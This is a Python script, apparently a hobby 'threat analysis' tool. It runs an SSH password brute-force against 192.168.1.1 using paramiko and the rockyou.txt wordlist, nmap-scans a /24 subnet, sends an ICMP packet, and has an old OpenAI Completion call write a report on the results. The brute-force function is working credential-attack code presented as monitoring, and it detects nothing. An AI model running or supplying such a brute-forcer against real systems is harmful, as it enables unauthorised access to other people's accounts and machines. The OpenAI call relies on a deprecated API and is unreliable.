import os
import time
import paramiko
import nmap
from scapy.all import IP, ICMP, send
import openai

# Function to perform brute-force SSH password cracking
def brute_force_ssh(ip, username, wordlist):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(wordlist, 'r') as f:
        for password in f:
            password = password.strip()
            try:
                ssh.connect(ip, username=username, password=password)
                return f"Password found: {password}"
            except paramiko.AuthenticationException:
                continue
    return "Password not found"

# Function to perform network scanning
def network_scan():
    nm = nmap.PortScanner()
    nm.scan('192.168.1.0/24', '22-443')
    scan_results = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            lport = nm[host][proto].keys()
            for port in lport:
                scan_results.append(f'Host: {host} Port: {port} State: {nm[host][proto][port]["state"]}')
    return scan_results

# Function to send ICMP packets
def send_icmp_packet(ip):
    pkt = IP(dst=ip)/ICMP()
    send(pkt)

# Function to generate threat analysis report using OpenAI's GPT-3
def generate_threat_report(threat_data):
    openai.api_key = 'your_openai_api_key'
    response = openai.Completion.create(
        engine="davinci",
        prompt=f"Generate a threat analysis report based on the following data: {threat_data}",
        max_tokens=500
    )
    return response.choices[0].text

# Main function to orchestrate the entire process
def main():
    ip = '192.168.1.1'
    username = 'admin'
    wordlist = 'rockyou.txt'  # Ensure rockyou.txt is downloaded and placed in the project directory

    # Perform brute-force SSH password cracking
    brute_force_result = brute_force_ssh(ip, username, wordlist)

    # Perform network scanning
    scan_results = network_scan()

    # Send ICMP packet
    send_icmp_packet(ip)

    # Generate threat analysis report
    threat_data = {
        'brute_force_attempts': brute_force_result,
        'network_scan_results': scan_results,
        'icmp_packet_sent': f'ICMP packet sent to {ip}'
    }
    report = generate_threat_report(threat_data)
    print(report)

    # Save report to a file
    report_filename = f'report_{time.strftime("%Y%m%d-%H%M%S")}.txt'
    with open(os.path.join('reports', report_filename), 'w') as f:
        f.write(report)

    # Add real-time alerting mechanism (example: print alert message)
    if 'suspicious activity' in report.lower():
        print("Alert: Suspicious activity detected!")

if __name__ == "__main__":
    main()
